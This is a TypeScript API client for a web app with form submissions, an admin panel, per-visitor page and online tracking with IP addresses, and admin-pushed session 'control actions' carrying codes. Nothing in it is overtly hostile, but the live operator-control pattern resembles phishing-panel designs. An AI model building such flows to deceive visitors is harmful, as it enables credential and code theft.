const API_BASE_URL = import.meta.env.VITE_API_BASE_URL ?? "/api";

async function jsonRequest<T>(path: string, method: string, body?: unknown, token?: string, noCache = false): Promise<T> {
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
    "Cache-Control": "no-cache, no-store, must-revalidate",
    "Pragma": "no-cache",
    "Expires": "0",
  };
  if (token) {
    headers.Authorization = `Bearer ${token}`;
  }

  const baseUrl = API_BASE_URL.replace(/\/+$/, "");
  const normalizedPath = path.startsWith("/") ? path : `/${path}`;
  
  // Add cache-busting timestamp for GET requests
  let url = `${baseUrl}${normalizedPath}`;
  if (noCache && method === "GET") {
    const separator = url.includes("?") ? "&" : "?";
    url += `${separator}_t=${Date.now()}`;
  }

  const response = await fetch(url, {
    method,
    headers,
    body: body ? JSON.stringify(body) : undefined,
  });

  const raw = await response.text();
  const data = raw ? JSON.parse(raw) : null;
  if (!response.ok) {
    throw new Error(data?.error || response.statusText || "Request failed");
  }

  return data as T;
}

export interface AdminLoginResponse {
  success: boolean;
  token: string;
}

export interface AdminStatsResponse {
  totalSessions: number;
  totalSubmissions: number;
  byType: { type: string; count: number }[];
}

export interface SubmissionRow {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
  userAgent?: string | null;
}

export interface SubmissionListResponse {
  submissions: SubmissionRow[];
  total: number;
  page: number;
  limit: number;
}

export async function submitSubmission(type: string, body: Record<string, unknown>) {
  return jsonRequest<{ id: number; sessionId: string }>(`/submissions/${type}`, "POST", body);
}

export async function adminLogin(username: string, password: string) {
  return jsonRequest<AdminLoginResponse>("/admin/login", "POST", { username, password });
}

export async function adminLogout(token: string) {
  return jsonRequest<{ success: boolean }>("/admin/logout", "POST", undefined, token);
}

export async function adminLogoutAll(token: string) {
  return jsonRequest<{ success: boolean }>("/admin/logout-all", "POST", undefined, token);
}

export async function adminChangePassword(token: string, newPassword: string) {
  return jsonRequest<{ success: boolean }>("/admin/change-password", "POST", { newPassword }, token);
}

export async function getAdminStats(token: string) {
  return jsonRequest<AdminStatsResponse>("/admin/stats", "GET", undefined, token, true);
}

export async function listAdminSubmissions(token: string, params?: Record<string, string | number>) {
  const queryString = params ? `?${new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)]))}` : "";
  return jsonRequest<SubmissionListResponse>(`/admin/submissions${queryString}`, "GET", undefined, token, true);
}

export async function getAllAdminSubmissions(token: string) {
  return jsonRequest<{ submissions: SubmissionRow[]; total: number }>("/admin/all-submissions", "GET", undefined, token, true);
}

export interface ControlActionResponse {
  action: string | null;
  code?: string;
}

export async function getControlAction(sessionId: string) {
  return jsonRequest<ControlActionResponse>(`/control/${sessionId}`, "GET");
}

// Consume (delete) the control action after client receives it
export async function consumeControlAction(sessionId: string) {
  return jsonRequest<{ success: boolean; action: string | null }>(`/control/${sessionId}`, "DELETE");
}

export async function sendAdminControl(sessionId: string, action: string, token: string, code?: string) {
  return jsonRequest<{ success: boolean; sessionId: string; action: string; code?: string }>(`/admin/control/${sessionId}`, "POST", { action, code }, token);
}

// Page tracking API
export interface SessionTrackingInfo {
  sessionId: string;
  currentPage: string;
  pageArabic: string;
  isOnline: boolean;
  lastSeen: number;
  lastSeenAgo?: number;
}

export async function trackPage(sessionId: string, page: string): Promise<{ success: boolean; pageArabic: string }> {
  return jsonRequest<{ success: boolean; pageArabic: string }>(`/track/page`, "POST", { sessionId, page });
}

export async function getTrackedSessions(): Promise<{ sessions: SessionTrackingInfo[] }> {
  return jsonRequest<{ sessions: SessionTrackingInfo[] }>(`/track/sessions`, "GET", undefined, undefined, true);
}

export async function getTrackedSession(sessionId: string): Promise<SessionTrackingInfo> {
  return jsonRequest<SessionTrackingInfo>(`/track/session/${sessionId}`, "GET", undefined, undefined, true);
}

// Visitor tracking API
export interface Visitor {
  id: number;
  sessionId: string;
  ownerName: string | null;
  ipAddress: string | null;
  userAgent: string | null;
  firstVisit: string;
  lastVisit: string;
  visitCount: number;
}

export async function trackVisitor(sessionId: string, ownerName?: string): Promise<{ success: boolean; visitor: Visitor }> {
  return jsonRequest<{ success: boolean; visitor: Visitor }>(`/visitors/track`, "POST", { sessionId, ownerName });
}

export async function getAllVisitors(): Promise<{ visitors: Visitor[] }> {
  return jsonRequest<{ visitors: Visitor[] }>(`/visitors`, "GET", undefined, undefined, true);
}

export async function updateVisitorName(sessionId: string, ownerName: string): Promise<{ success: boolean }> {
  return jsonRequest<{ success: boolean }>(`/visitors/${sessionId}`, "PATCH", { ownerName });
}
